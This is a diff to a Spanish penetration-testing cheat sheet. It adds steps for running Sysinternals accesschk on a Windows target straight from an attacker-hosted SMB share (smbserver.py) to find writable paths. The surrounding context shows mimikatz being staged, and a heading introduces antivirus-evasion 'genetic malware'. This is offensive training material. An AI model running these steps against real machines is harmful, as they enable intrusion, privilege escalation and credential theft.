@@ -1400,6 +1400,13 @@ Posteriormente, nos traemos al equipo los recursos que consideremos:
 move mimikatz.exe C:\Users\s4vitar\Desktop\mimikatz.exe
 ```
 
+Podemos no complicar tanto las cosas, haciendo uso para ello del siguiente procedimiento (A modo de ejemplo, ejecutamos en remoto a tiempo real sobre el equipo Windows el binario _accesschk_v5.02.exe_:
+
+* smbserver.py parrotSmbFolder ~/Recurso/ # Especificamos el directorio cuyos recursos queremos compartir
+* \\IP\parrotSmbFolder\accesschk_v5.02.exe -accepteula -uwqs "usuario" C:\*.*
+
+Esto a su vez nos sirve para copiar archivos del recurso compartido por Samba.
+
 #### AV Evasion Genetic Malware
 
 A continuación, se detalla el procedimiento para crear **Malware Genético**, ideal y de utilidad para la evasión de antivirus así como del propio Windows Defender.
